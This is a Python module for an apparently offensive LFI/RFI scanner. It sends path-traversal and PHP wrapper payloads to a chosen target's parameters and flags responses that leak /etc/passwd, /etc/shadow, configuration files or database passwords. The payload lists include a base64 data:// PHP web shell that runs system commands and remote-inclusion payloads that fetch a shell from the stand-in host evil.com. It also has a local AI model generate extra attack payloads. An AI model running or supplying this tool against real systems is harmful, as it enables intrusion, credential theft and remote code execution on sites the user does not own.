import re
import requests
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, quote
from utils.output import section, info, success, warning, error, result, table
from utils.ollama_helper import OllamaHelper

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../etc/passwd%00",
    "../../../../etc/passwd%00",
    "../../../etc/passwd%00.php",
    "../../../../etc/passwd%00.php",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=config.php",
    "php://filter/convert.base64-encode/resource=../../etc/passwd",
    "php://filter/zlib.deflate/convert.base64-encode/resource=config.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2b",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "../../../proc/self/environ",
    "../../../proc/self/fd/0",
    "../../../proc/self/fd/1",
    "../../../proc/self/fd/2",
    "../../../var/log/apache2/access.log",
    "../../../var/log/apache/access.log",
    "../../../var/log/nginx/access.log",
    "../../../var/log/httpd/access_log",
    "../../../usr/local/apache/logs/access_log",
    "expect://id",
    "/etc/passwd",
    "/windows/win.ini",
    "c:\\boot.ini",
    "../../../etc/shadow",
    "../../../etc/hosts",
    "../../../etc/issue",
    "../../../etc/group",
    "../../../etc/mysql/my.cnf",
    "../../../etc/php/php.ini",
    "../../../etc/httpd/conf/httpd.conf",
    "../../../etc/apache2/apache2.conf",
    "../../../etc/nginx/nginx.conf",
    "../../../etc/ssh/sshd_config",
    "../../../var/www/html/index.php",
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt?",
    "http://evil.com/shell.txt%00",
    "https://evil.com/shell.php?cmd=id",
    "http://evil.com/phpinfo.txt?",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
    "php://filter/convert.base64-encode/resource=http://evil.com/shell.txt",
    "http://evil.com/shell.php%00",
]

PAYLOAD_TAGS = {
    "/etc/passwd": "LFI_FOUND",
    "root:x:0:0": "LFI_FOUND",
    "root:" : "LFI_FOUND",
    "win.ini": "LFI_FOUND",
    "boot.ini": "LFI_FOUND",
    "LoadProfile": "LFI_FOUND",
    "extension=": "PHP_FILTER",
    "base64": "PHP_FILTER",
    "PD9waHA": "DATA_WRAPPER",
    "echo": "EXPECT_EXEC",
    "Unable to open": "ERROR_BASED",
    "include(": "ERROR_BASED",
    "failed to open stream": "ERROR_BASED",
    "Warning: include": "ERROR_BASED",
    "Warning: require": "ERROR_BASED",
    "Fatal error": "ERROR_BASED",
    "UID=": "LFI_FOUND",
    "gid=": "LFI_FOUND",
    "www-data": "LFI_FOUND",
    "nobody": "LFI_FOUND",
    "uid=": "LFI_FOUND",
    "gid=": "LFI_FOUND",
    "groups=": "LFI_FOUND",
    "DB_HOST": "LFI_CONFIG",
    "DB_PASSWORD": "LFI_CONFIG",
    "DB_USER": "LFI_CONFIG",
    "password": "LFI_CONFIG",
    "<?php": "LFI_PHP",
    "<?=": "LFI_PHP",
}


class LFIRFIScanner:
    name = "lfi-rfi"
    description = "Local File Inclusion and Remote File Inclusion vulnerability scanner"

    @staticmethod
    def run(target, params="", method="GET", data="", timeout=10, threads=20, ollama_model=None):
        section(f"LFI/RFI Scanner: {target}")

        ollama = OllamaHelper(model=ollama_model) if ollama_model else None
        results = {"target": target, "vulnerabilities": [], "total_tests": 0, "findings": 0}
        all_vulns = []

        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        test_params = [p.strip() for p in params.split(",") if p.strip()] if params else []
        all_payloads = list(LFI_PAYLOADS + RFI_PAYLOADS)
        if not test_params:
            parsed = urlparse(target)
            qs = parse_qs(parsed.query)
            test_params = list(qs.keys())
            if not test_params:
                test_params = ["file", "page", "path", "load", "read", "include", "template", "document", "dir", "show", "view", "cat", "f"]

        if ollama and ollama.available:
            ai_payloads = ollama.generate_lfi_payloads(target)
            if ai_payloads:
                seen = set(all_payloads)
                for p in ai_payloads:
                    if p not in seen:
                        all_payloads.append(p)
                        seen.add(p)
                info(f"AI contributed {len(ai_payloads)} payloads ({len([p for p in ai_payloads if p in seen])} unique combined)")

        base_url = target
        for param_name in test_params:
            info(f"Testing parameter: {param_name}")
            for payload in all_payloads:
                results["total_tests"] += 1
                try:
                    if method.upper() == "POST":
                        post_data = {}
                        if data:
                            for pair in data.split("&"):
                                if "=" in pair:
                                    k, v = pair.split("=", 1)
                                    post_data[k] = v
                        if param_name in post_data:
                            post_data[param_name] = payload
                        else:
                            post_data[param_name] = payload
                        resp = requests.post(base_url, data=post_data, timeout=timeout,
                            headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=False)
                    else:
                        parsed = urlparse(base_url)
                        qs_params = parse_qs(parsed.query)
                        path = parsed.path
                        if param_name in qs_params:
                            qs_params[param_name] = [payload]
                        else:
                            qs_params[param_name] = [payload]
                        new_qs = urlencode(qs_params, doseq=True)
                        test_url = f"{parsed.scheme}://{parsed.netloc}{path}?{new_qs}"
                        resp = requests.get(test_url, timeout=timeout,
                            headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=False)

                    body = resp.text
                    for tag, vuln_type in PAYLOAD_TAGS.items():
                        if tag.lower() in body.lower():
                            finding = {
                                "param": param_name,
                                "payload": payload,
                                "type": vuln_type,
                                "status_code": resp.status_code,
                                "length": len(body),
                            }
                            all_vulns.append(finding)
                            results["findings"] += 1
                            success(f"[{vuln_type}] {param_name} = {payload[:60]}... ({resp.status_code}, {len(body)}b)")
                            break

                    # Check if request itself had RFI-like payload
                    if payload.startswith("http://") or payload.startswith("https://"):
                        if "<?php" in body or "system(" in body:
                            finding = {
                                "param": param_name,
                                "payload": payload,
                                "type": "RFI_EXEC",
                                "status_code": resp.status_code,
                                "length": len(body),
                            }
                            all_vulns.append(finding)
                            results["findings"] += 1
                            success(f"[RFI_EXEC] {param_name} = {payload[:60]}... ({resp.status_code}, {len(body)}b)")

                except requests.exceptions.RequestException:
                    pass
                except Exception:
                    pass

        if all_vulns:
            result("Total vulnerabilities found", str(len(all_vulns)))
            result("Parameters tested", ", ".join(test_params))

            table(["Parameter", "Type", "Payload", "Status"], [
                [v["param"], v["type"], v["payload"][:50], str(v["status_code"])] for v in all_vulns[:20]
            ])

            if len(all_vulns) > 20:
                info(f"... and {len(all_vulns) - 20} more findings")
        else:
            warning("No LFI/RFI vulnerabilities detected")

        results["vulnerabilities"] = all_vulns
        results["parameters_tested"] = test_params
        return results
